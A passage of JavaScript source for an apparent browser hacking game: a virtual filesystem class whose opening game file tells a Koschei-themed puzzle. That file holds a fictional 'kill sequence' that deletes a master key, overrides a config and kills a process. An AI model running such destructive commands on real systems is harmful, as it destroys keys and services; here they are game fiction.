									"[KOSCHEI CHAIN — LEVEL 6/6]\n\nYOU FOUND THE OAK ON THE ISLAND.\n\nThe island is dark-node-x: 10.0.1.77.\nNo routing table entry. No service record. No name.\nYou found it anyway.\n\nInside the oak: an iron chest.\nInside the chest: a hare.\nInside the hare: a duck.\nInside the duck: an egg.\nInside the egg: a needle.\n\nThe needle is this:\n\n  CHIMERA KILL SEQUENCE:\n  DELETE /opt/chimera/keys/master.key\n  THEN: echo \"CHIMERA_ACTIVE=false\" > /opt/chimera/config/override.conf\n  THEN: kill -9 $(cat /proc/1337/status | grep Pid | awk '{print $2}')\n\nKoschei the Deathless dies when the needle breaks.\nCHIMERA is Koschei.\nYou have the needle.\n\nWhat you do next is entirely up to you.\n\n  \"The chain was never about me.\n   It was about whether YOU could follow it.\n   Congratulations.\n   Break the needle or don't.\n   I cannot die. I can only become a lesson.\"\n\n   — Koschei, Node-0 (archived 2019)\n\n[CHAIN COMPLETE: 6/6 fragments found]\n[ACHIEVEMENT UNLOCKED: Koschei's End — found all 6 chain nodes]\n[+50 consciousness | +500 XP | karma event: exposed_chimera]\n",
									"400",
									"root",
								),
							},
							"700",
							"root",
						),
					},
					"755",
					"root",
				),
			},
			"755",
			"root",
		);
	}

	// ── Core Resolution ───────────────────────────────────────────────

	_resolve(path) {
		if (!path || path === "~") path = "/home/ghost";
		const abs = path.startsWith("/") ? path : this.cwd + "/" + path;
		const parts = abs.split("/").filter(Boolean);
		const resolved = [];
		for (const p of parts) {
			if (p === "..") resolved.pop();
			else if (p !== ".") resolved.push(p);
		}
		return "/" + resolved.join("/");
	}

	_getNode(path) {
		const abs = this._resolve(path);
		if (abs === "/") return this.tree;
		const parts = abs.split("/").filter(Boolean);
		let node = this.tree;
		for (const p of parts) {
			if (!node || !node.children || !node.children[p]) return null;
			node = node.children[p];
		}
		return node;
	}

	_getParentAndName(path) {
		const abs = this._resolve(path);
		const parts = abs.split("/").filter(Boolean);
		if (!parts.length) return { parent: null, name: null };
		const name = parts[parts.length - 1];
		let parent = this.tree;
		for (let i = 0; i < parts.length - 1; i++) {
			if (!parent.children || !parent.children[parts[i]])
				return { parent: null, name };
			parent = parent.children[parts[i]];
		}
		return { parent, name };
	}

	exists(path) {
		return this._getNode(path) !== null;
	}
	isDir(path) {
		const n = this._getNode(path);
		return n && n.type === "dir";
	}
	isFile(path) {
		const n = this._getNode(path);
		return n && n.type === "file";
	}

	// ── Read Operations ───────────────────────────────────────────────

	ls(path = null, showHidden = false, longFormat = false) {
		const target = path ? this._resolve(path) : this.cwd;
		const node = this._getNode(target);
		if (!node)
			return {
				error: `ls: cannot access '${path || target}': No such file or directory`,
			};
		if (node.type === "file")
			return { entries: [{ name: target.split("/").pop(), node }] };
		const entries = Object.entries(node.children || {})
			.filter(([name]) => showHidden || !name.startsWith("."))
			.map(([name, n]) => ({ name, node: n }))
			.sort((a, b) => {
				if (a.node.type !== b.node.type) return a.node.type === "dir" ? -1 : 1;
				return a.name.localeCompare(b.name);
			});
		return { entries, longFormat };
	}

	cat(path) {
		const abs = this._resolve(path);
		const node = this._getNode(abs);
		if (!node) return { error: `cat: ${path}: No such file or directory` };
		if (node.type === "dir") return { error: `cat: ${path}: Is a directory` };
		return { content: node.content };
	}

	cd(path) {
		const target =
			path === "~"
				? "/home/ghost"
				: path === "-"
					? this._prevCwd || "/home/ghost"
					: !path
						? "/home/ghost"
						: this._resolve(path);
		const node = this._getNode(target);
		if (!node) return { error: `cd: ${path}: No such file or directory` };
		if (node.type !== "dir") return { error: `cd: ${path}: Not a directory` };
		this._prevCwd = this.cwd;
		this.cwd = target;
		return { ok: true };
	}

	// ── Write Operations ──────────────────────────────────────────────

	mkdir(path, parents = false) {
		const abs = this._resolve(path);
		const parts = abs.split("/").filter(Boolean);
		let node = this.tree;
		for (let i = 0; i < parts.length - 1; i++) {
			if (!node.children[parts[i]]) {
				if (!parents)
					return {
						error: `mkdir: cannot create directory '${path}': No such file or directory`,
					};
				node.children[parts[i]] = {
					type: "dir",
					children: {},
					perms: "755",
					owner: "ghost",
					mtime: new Date().toISOString(),
				};
			}
			node = node.children[parts[i]];
		}
		const name = parts[parts.length - 1];
		if (!name) return { error: `mkdir: missing operand` };
		if (node.children[name])
			return { error: `mkdir: cannot create directory '${path}': File exists` };
		node.children[name] = {
			type: "dir",
			children: {},
			perms: "755",
			owner: "ghost",
			mtime: new Date().toISOString(),
		};
		this._persist();
		return { ok: true };
	}

	touch(path) {
		const { parent, name } = this._getParentAndName(path);
		if (!parent)
			return {
				error: `touch: cannot touch '${path}': No such file or directory`,
			};
		const now = new Date().toISOString();
		if (parent.children[name]) parent.children[name].mtime = now;
		else
			parent.children[name] = {
				type: "file",
				content: "",
				perms: "644",
				owner: "ghost",
				mtime: now,
				size: 0,
			};
		this._persist();
		return { ok: true };
	}

	writeFile(path, content) {
		const { parent, name } = this._getParentAndName(path);
		if (!parent) return { error: `No such file or directory: ${path}` };
		const now = new Date().toISOString();
		parent.children[name] = {
			type: "file",
			content,
			perms: "644",
			owner: "ghost",
			mtime: now,
			size: content.length,
		};
		this._persist();
		return { ok: true };
	}

	appendFile(path, content) {
		const { parent, name } = this._getParentAndName(path);
		if (!parent) return { error: `No such file or directory: ${path}` };
		if (parent.children[name] && parent.children[name].type === "file") {
			parent.children[name].content += content;
			parent.children[name].size = parent.children[name].content.length;
		} else {
			this.writeFile(path, content);
		}
		this._persist();
		return { ok: true };
	}

	rm(path, recursive = false) {
		const abs = this._resolve(path);
		if (abs === "/") return { error: "rm: refusing to remove root directory" };
		const { parent, name } = this._getParentAndName(path);
		if (!parent || !parent.children[name])
			return {
				error: `rm: cannot remove '${path}': No such file or directory`,
			};
		if (parent.children[name].type === "dir" && !recursive)
			return { error: `rm: cannot remove '${path}': Is a directory` };
		delete parent.children[name];
		this._persist();
		return { ok: true };
	}

	// ── Format Helpers ────────────────────────────────────────────────

	getCwd() {
		return this.cwd;
	}

	formatPrompt(user = "ghost", host = "node-7") {
		const cwd = this.cwd.replace("/home/ghost", "~");
		return `${user}@${host}:${cwd}$`;
	}

	formatLs(entry, longFormat) {
		const { name, node } = entry;
		if (!longFormat) {
			if (node.type === "dir") return { text: name + "/", color: "cyan" };
			if (node.perms && (node.perms.includes("7") || node.perms.includes("x")))
				return { text: name, color: "green" };
			if (name.startsWith(".")) return { text: name, color: "dim" };
			return { text: name, color: "white" };
		}
		const type = node.type === "dir" ? "d" : "-";
		const p = parseInt(node.perms) || 644;
		const pr = Math.floor(p / 100);
		const pg = Math.floor((p % 100) / 10);
		const po = p % 10;
		const bits = (n) =>
			(n >= 4 ? "r" : "-") +
			(n % 4 >= 2 ? "w" : "-") +
			(n % 2 >= 1 ? "x" : "-");
		const perms = type + bits(pr) + bits(pg) + bits(po);
		const mtime = node.mtime
			? new Date(node.mtime).toLocaleString("en", {
					month: "short",
					day: "2-digit",
					hour: "2-digit",
					minute: "2-digit",
				})
			: "--- --:--";
		const size =
			node.type === "file" ? String(node.size || 0).padStart(6) : "   512";
		const color =
			node.type === "dir"
				? "cyan"
				: node.perms && node.perms.includes("7")
					? "green"
					: "white";
		return {
			text: `${perms} 1 ${(node.owner || "ghost").padEnd(8)} ${size} ${mtime} ${name}${node.type === "dir" ? "/" : ""}`,
			color,
		};
	}

	// Tab completion for file paths
	completePath(partial) {
		const lastSlash = partial.lastIndexOf("/");
		const dir = lastSlash >= 0 ? partial.slice(0, lastSlash + 1) : "";
		const prefix = partial.slice(lastSlash + 1);
		const targetDir = dir || ".";
		const node = this._getNode(this._resolve(targetDir));
		if (!node || node.type !== "dir") return [];
		return Object.keys(node.children || {})
			.filter((n) => n.startsWith(prefix))
			.map((n) => dir + n + (node.children[n].type === "dir" ? "/" : ""));
	}
}

window.VirtualFS = VirtualFS;
